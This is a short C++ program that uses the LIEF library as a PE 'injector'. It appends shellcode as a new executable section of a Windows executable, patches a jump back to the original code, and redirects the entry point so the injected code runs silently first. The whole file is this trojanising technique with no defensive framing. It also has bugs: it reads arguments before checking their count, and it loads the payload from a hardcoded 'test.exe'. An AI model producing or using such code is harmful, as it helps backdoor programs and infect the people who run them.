#include <fstream>
#include <iostream>
#include <LIEF/LIEF.hpp>

int main(int argc, char* argv[]) {
    const std::string file = argv[1];
    const std::string output = argv[2];
    const std::string shellcode_f = argv[3];
    if (argc < 4) {
        std::cout << "Usage: injector.exe input.exe output.exe shellcode.bin" << std::endl;
    }

    unsigned char* shellcode = nullptr;

    std::ifstream _file("test.exe", std::ios::binary | std::ios::ate);
    size_t size = _file.tellg();
    _file.seekg(0);

    shellcode = new unsigned char[size];
    _file.read((char*)shellcode, size);

    auto pe = LIEF::PE::Parser::parse(file);
    for (const LIEF::PE::Section& section : pe->sections()) {
        std::cout << section.name() << " - Size: " << section.content().size() << '\n';
    }
    auto original_ep = pe->optional_header().addressof_entrypoint();

    LIEF::PE::Section codesec(".code");

    //size_t size = sizeof(shellcode) / sizeof(shellcode[0]);

    std::vector<uint8_t> payload(
        reinterpret_cast<uint8_t*>(shellcode),
        reinterpret_cast<uint8_t*>(shellcode) + size
    );

    // temporary placeholder for jump
    payload.push_back(0xE9);
    payload.resize(payload.size() + 4);

    codesec.content(payload);

    codesec.add_characteristic(LIEF::PE::Section::CHARACTERISTICS::MEM_EXECUTE);
    codesec.add_characteristic(LIEF::PE::Section::CHARACTERISTICS::MEM_READ);
    codesec.add_characteristic(LIEF::PE::Section::CHARACTERISTICS::CNT_CODE);

    auto section = pe->add_section(codesec);

    uint32_t section_rva = section->virtual_address();
    uint32_t jump_pos = size;

    int32_t rel = original_ep - (section_rva + jump_pos + 5);

    payload[jump_pos + 1] = rel & 0xFF;
    payload[jump_pos + 2] = (rel >> 8) & 0xFF;
    payload[jump_pos + 3] = (rel >> 16) & 0xFF;
    payload[jump_pos + 4] = (rel >> 24) & 0xFF;

    section->content(payload);

    pe->optional_header().addressof_entrypoint(section_rva);

    pe->write(output);
}